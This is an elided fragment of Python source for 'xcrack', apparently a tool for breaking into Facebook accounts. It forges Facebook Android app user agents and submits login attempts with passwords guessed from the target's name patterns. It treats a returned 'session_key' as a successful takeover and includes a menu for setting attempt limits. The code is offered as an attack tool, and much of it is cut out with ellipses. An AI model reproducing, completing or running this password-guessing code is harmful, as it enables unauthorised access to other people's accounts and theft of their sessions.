...
class xcrack():
    ...
    def methodCHI(self, sid, name, psw):
        try:
            ...
            sys.stdout.flush()
            fs = name.split(' ')[0]
            version_ = str(random.randint(9,13))
            model_ = "22041219I"
            brand_name_ = "Xiaomi"
            width_ = "720"
            height_ = "1280"
            siv=random.choice(['63.0.0.0.19','63.0.0.0.8','62.0.0.42.77','62.0.0.39.77','62.0.0.19.77','62.0.0.13.77','62.0.0.11.77','62.0.0.8.77'])
            ua=f'[FBAN/Orca-Android;FBAV/{siv};FBPN/com.facebook.katana;FBLC/en_GB;FBBV/'+str(random.randint(700000000,830000000))+';FBCR/;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+model_+';FBSV/'+version_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width='+width_+',height='+height_+'};FB_FW/1;]'
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs    
...
'Content-Length': '2126'}
                ...
                q = ses.post(curl,headers=headers, data=data).json()
                if 'session_key' in q:
    ...
    def pasw(self):
        ...
        if psw =='1':
            ...
            sl = int(input('[+] Total limit :-'))
            os.system("clear")
            banner()
            print(f'{S}[Example:first,last,firstlast,first last etc]')
            print('')
            if sl =='':
            ...
            print("\033[1;97m[+] VERSION :0.2\x1b[0m")
